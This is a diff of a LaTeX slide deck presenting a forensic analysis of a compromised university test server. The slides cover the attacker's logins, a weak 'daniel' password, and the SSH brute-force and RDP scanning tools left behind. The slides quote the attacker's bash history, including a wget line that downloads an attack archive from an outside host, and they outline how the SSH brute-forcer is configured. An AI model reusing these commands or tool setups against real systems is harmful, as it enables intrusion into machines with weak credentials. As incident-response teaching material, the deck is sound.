@@ -47,23 +47,14 @@
 \section{Background}
 
 \subsection{Introduction}
-\frame{\frametitle{About}
-\begin{itemize}
-	% \item Overview of compromised test server
-	% \item University network
-    \item Compromised machine was a controller for a test cluster
-    \item Set up on 17th November 2014
-    \item Notified of breach on 24th November
 
-        % 'what do we do now'
-\end{itemize}
-}
-
-\subsection{Technical}
 \frame{\frametitle{The Network}
 \begin{itemize}
     
+    \item Compromised machine was a controller for a test cluster
+    \vspace{10pt}
     \item Small network with manager and slave nodes
+    \vspace{10pt}
     \item Test hadoop setup, services on LAN side
 
         % Topology picture
@@ -83,8 +74,10 @@
     
     \item Ubuntu MAAS
         % mention this is why people have ubuntu VMs
+    \vspace{10pt}
     \item Two NICs, one on university network
         % forward and backward facing (LAN, WAN)
+    \vspace{10pt}
     \item Machine is old commodity machine
         %
 
@@ -95,7 +88,13 @@
 \frame{\frametitle{Situational Overview}
 \begin{itemize}
 	\item System install: 17th November
+    \vspace{10pt}
 	\item Notification of breach: 24th November
+    \begin{itemize}
+        \item Failed login/changed password
+        \item Notification by ISS/external
+    \end{itemize}
+    \vspace{10pt}
     \item Disks imaged, mounted read-only
 \end{itemize}
 }
@@ -108,12 +107,14 @@
 \section{Investigation}
 \frame{\frametitle{Investigation}
 \begin{itemize}
-    \item Stuff left over in \texttt{~daniel/}
+    \item Stuff left over in \texttt{\~{}daniel/}
         \begin{itemize}
             \item \texttt{~/.bssh}
             \item \texttt{~/.vogz}
         \end{itemize}
-    \item Logs (bash, auth, squid)
+    \vspace{10pt}
+    \item System logs (bash, auth, squid)
+    \vspace{10pt}
     \item Resources pointed to by the above
 \end{itemize}
 }
@@ -121,11 +122,15 @@
 \subsection{Logs}
 \frame{\frametitle{Logs}
 
-File: \texttt{logs.tgz}
+File: \texttt{logs.tar.gz}
+    \vspace{10pt}
 \begin{itemize}
     \item \texttt{\_bash\_history} contains the command log
+    \vspace{10pt}
     \item \texttt{auth.log} contains the system auth log
+    \vspace{10pt}
     \item \texttt{edited\_files\_in...} contains all files edited since November 23rd
+    \vspace{10pt}
     \item \texttt{var\_log\_squid3} contains \texttt{/var/log/squid3}.
 \end{itemize}
 }
@@ -133,7 +138,9 @@ File: \texttt{logs.tgz}
 \frame{\frametitle{Logs}
 \begin{itemize}
     \item Logins at 2:21, 3:03 and 15:20
+    \vspace{10pt}
     \item Bash history downloading archives/running \texttt{screen}
+    \vspace{10pt}
     \item Entries for \url{www.adulttraffictrade.net} in the SQUID logs
 \end{itemize}
 }
@@ -143,7 +150,7 @@ File: \texttt{logs.tgz}
 \begin{verbatim}
 w
 ls
-pass wd
+passwd
 ifconfig
 cat /proc/cpuinfo
 wget http://descargarcs.net63.net/fv/ghh.tgz
@@ -157,14 +164,27 @@ screen
 \end{frame}
 
 
+% Explain for those not familiar with bash
+\begin{frame}[fragile=singleslide]\frametitle{Curiosities}
+\begin{itemize}
+    \item Why not delete the bash history?
+    \vspace{10pt}
+    \item Why not delete login entries from the log?
+    \vspace{10pt}
+    \item Why change the password?
+\end{itemize}
+\end{frame}
+
+
 \subsection{Files}
 \frame{\frametitle{BSSH}
 % Any files edited after 23rd
 
-File: \texttt{\_bssh.tgz}
+File: \texttt{\_bssh.tar.gz}
 \begin{itemize}
 
-    \item Left over in \texttt{~daniel}
+    \item Left over in \texttt{\~{}daniel}
+    \vspace{10pt}
     \item A quick google shows the docs, to be found in \texttt{hackforums/}
 
 \end{itemize}
@@ -177,11 +197,14 @@ File: \texttt{\_bssh.tgz}
         \url{http://descargarcs.net63.net/fv/ghh.tgz} ?
     }
 
+    \vspace{10pt}
     \visible<2>{
-        File: \texttt{\_vogz.tgz}
-        % \begin{itemize}
-        %     \item 
-        % \end{itemize}
+        File: \texttt{\_vogz.tar.gz}
+        \begin{itemize}
+            \item Another scanning tool
+            \vspace{10pt}
+            \item Not found on disk, perhaps deleted after execution?
+        \end{itemize}
     }
 }
 
@@ -190,17 +213,20 @@ File: \texttt{\_bssh.tgz}
 % SSH scan analysis
 % -----------------------------------------------------------------------
 \section{Software 1}
-\subsection{SSH Scanner}
+\subsection*{SSH Scanner}
 \frame{\frametitle{SSH Scanner}
 \begin{center}
-	File: \texttt{\_bssh.tgz}	
+	File: \texttt{\_bssh.tar.gz}	
 \end{center}
 Three binaries:
 \begin{itemize}
 	\item scan: script to control pscan
+    \vspace{10pt}
 	\item pscan: port scanning tool generates list of open ports used by ssh2
+    \vspace{10pt}
 	\item ssh2: attempts login at produced list.
-	\item screen
+    \vspace{10pt}
+	\item core dumps, nobash, screen
 	\end{itemize}
 }
 
@@ -230,13 +256,13 @@ sleep 2
 Tool takes as input:
 \begin{itemize}
 	\item pass.txt: list of common username / password combinations.	
-	\end{itemize}
+\end{itemize}
 	
 Attacker may configure:
 \begin{itemize}
 	\item PscanThreads: speed of IP scanning
 	\item ssh2Threads: speed of brute-forcing
-	\end{itemize}
+\end{itemize}
 
 Tool generates: 
 \begin{itemize}
@@ -252,12 +278,13 @@ Tool generates:
 % RDP scan analysis
 % -----------------------------------------------------------------------
 \section{Software 2}
-\subsection{ghh.tgz: RDP Scanner}
+\subsection*{ghh.tgz: RDP Scanner}
 \frame{\frametitle{RDP Scanner}
 
-File: \texttt{\_vogz.tgz}
+File: \texttt{\_vogz.tar.gz}
 \begin{center}
     \item \url{http://descargarcs.net63.net/fv/ghh.tgz} contains an RDP scanner
+    \vspace{10pt}
     \item We don't know if this was run or not
 \end{center}
 }
@@ -283,8 +310,11 @@ done
 \frame{\frametitle{Summary}
 \begin{itemize}
     \item The user connected for the first time at 2:21 from 104.131.165.104, and immediately disconnected
+    \vspace{10pt}
     \item 3:03 - 9:34 from 79.115.46.59 (Bucharest), presumably to do the RDP scan
+    \vspace{10pt}
     \item 15:20 - 10:29 the next day from 79.115.46.59, presumably running the SSH scan
+    \vspace{10pt}
     \item At 10:29 the machine was rebooted, kicking the attacker
 \end{itemize}
 }
@@ -293,25 +323,30 @@ done
 \frame{\frametitle{Summary II}
 \begin{itemize}
     \item The vulnerability was the `daniel' account, which had the password `daniel'
+    \vspace{10pt}
     \item We don't know if the RDP scanner worked, or what it found
+    \vspace{10pt}
     \item We don't know the significance, if any, of the SQUID logs.
 \end{itemize}
 }
 
 
 \frame{\frametitle{Resources / References}
-			Tools used:
+Tools used:
 \begin{itemize}
-				\item Rootkit detection: e.g. rkhunter, chkrootkit
-				\item extundelete: attempting to recover lost files
-				\item 'find / - newermt "Nov 23" - identify files changed since attack
-			
+    \item Rootkit detection: e.g. rkhunter, chkrootkit
+    \vspace{10pt}
+    \item \texttt{extundelete}: attempting to recover lost files
+    \vspace{10pt}
+\item \texttt{find / - newermt "Nov 23"} - identify files changed since attack
 \end{itemize}			
-			Reference:
+
+Reference:
 \begin{itemize}
 
-        \item Sectools.org - Network security / pentesting tools
-				\item Report of activity 
+    \item Sectools.org - Network security / pentesting tools
+    \vspace{10pt}
+    \item Report of activity (File: \texttt{terse.ly/misc/files/ssh\_report.pdf}) 
 \end{itemize}
 }
 
